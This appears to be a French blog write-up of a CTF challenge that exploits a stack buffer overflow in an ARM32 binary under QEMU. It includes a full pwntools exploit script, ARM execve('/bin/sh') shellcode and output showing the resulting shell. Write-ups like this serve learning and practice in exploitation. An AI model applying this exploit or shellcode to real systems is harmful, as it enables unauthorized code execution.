---
title: "Exemple: Buffer Overflow sur architecture ARM"
date: 2025-08-10
draft: false
---

## Introduction

Ce writeup présente l'exploitation d'un buffer overflow sur une architecture ARM32 lors d'un CTF. Le challenge impliquait un binaire vulnérable avec NX désactivé.

## Analyse du binaire

### Informations de base

```bash
$ file vuln_arm
vuln_arm: ELF 32-bit LSB executable, ARM, version 1 (SYSV), dynamically linked

$ checksec vuln_arm
[*] '/home/user/vuln_arm'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
```

### Désassemblage

Le binaire contient une fonction vulnérable :

```c
void vulnerable() {
    char buffer[64];
    gets(buffer);  // Vulnérable !
    printf("You entered: %s\n", buffer);
}
```

## Exploitation

### Calcul de l'offset

J'ai utilisé un pattern cyclique pour trouver l'offset :

```python
from pwn import *

context.arch = 'arm'
pattern = cyclic(200)

p = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabi/', './vuln_arm'])
p.sendline(pattern)
p.wait()

# Offset trouvé : 76 bytes
```

### Création du shellcode ARM

Shellcode pour exécuter `/bin/sh` :

```python
shellcode = asm("""
    /* execve("/bin/sh", NULL, NULL) */
    mov r0, pc
    add r0, r0, #16
    sub r2, r2, r2
    sub r1, r1, r1
    mov r7, #11
    svc #0
    .string "/bin/sh"
""")
```

### Exploit final

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'arm'
context.endian = 'little'

# Shellcode
shellcode = asm("""
    mov r0, pc
    add r0, r0, #16
    sub r2, r2, r2
    sub r1, r1, r1
    mov r7, #11
    svc #0
    .string "/bin/sh"
""")

# Adresse du buffer sur la stack
buffer_addr = 0xbefff678

# Construction du payload
offset = 76
payload = shellcode.ljust(offset, b'\x90')
payload += p32(buffer_addr)

# Exploitation
p = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabi/', './vuln_arm'])
p.sendline(payload)
p.interactive()
```

## Challenges rencontrés

### 1. Émulation ARM

Pour tester localement, j'ai utilisé QEMU :

```bash
sudo apt install qemu-user qemu-user-static gcc-arm-linux-gnueabi
qemu-arm -L /usr/arm-linux-gnueabi/ ./vuln_arm
```

### 2. Alignement mémoire

ARM nécessite un alignement strict des adresses. J'ai dû m'assurer que mes adresses étaient alignées sur 4 bytes.

### 3. Mode Thumb vs ARM

Le processeur peut être en mode ARM (32-bit) ou Thumb (16-bit). J'ai utilisé le mode ARM classique pour simplifier.

## Résultat

```bash
$ python3 exploit.py
[+] Starting local process: Done
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ cat flag.txt
FLAG{arm_buff3r_0v3rfl0w_m4st3r}
```

## Apprentissages

Cette exploitation m'a permis de comprendre :

1. Les spécificités de l'architecture ARM
2. L'importance de l'alignement mémoire
3. Les différences avec les exploits x86
4. L'utilisation de QEMU pour l'émulation
5. L'écriture de shellcode ARM

## Références

- [ARM Assembly Basics](https://azeria-labs.com/writing-arm-assembly-part-1/)
- [ARM Exploitation](https://www.exploit-db.com/docs/english/43906-arm-exploitation.pdf)
- [Azeria Labs ARM Tutorials](https://azeria-labs.com/)

## Conclusion

L'exploitation sur ARM est différente de x86 mais suit les mêmes principes fondamentaux. La compréhension de l'architecture est cruciale pour réussir.
